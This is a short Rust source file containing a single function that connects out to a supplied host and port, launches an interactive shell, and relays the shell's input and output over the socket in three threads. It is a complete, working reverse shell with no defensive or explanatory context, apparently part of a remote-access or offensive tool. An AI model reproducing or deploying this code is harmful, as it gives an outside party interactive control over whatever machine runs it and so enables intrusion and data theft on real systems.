use std::io::{copy, Result};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;

pub(crate) fn shell(host: String, port: String, shell: String) -> Result<()> {
    let mut sock_write = TcpStream::connect(format!("{}:{}", host, port))?;
    // sock_write.set_nonblocking(false)?;
    let mut sock_write_err = sock_write.try_clone()?;
    let mut sock_read = sock_write.try_clone()?;

    // Open shell
    let mut child = Command::new(shell)
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut stdin = child.stdin.take().expect("Failed to open stdin");
    let mut stdout = child.stdout.take().expect("Failed to open stdout");
    let mut stderr = child.stderr.take().expect("Failed to open stderr");

    //FIXME: Use async IO if possible
    thread::spawn(move || {
        copy(&mut stdout, &mut sock_write).expect("stdout closed");
    });
    thread::spawn(move || {
        copy(&mut stderr, &mut sock_write_err).expect("stderr closed");
    });
    thread::spawn(move || {
        copy(&mut sock_read, &mut stdin).expect("stdin closed");
    });

    child.wait()?;

    log::warn!("Shell exited");

    Ok(())
}
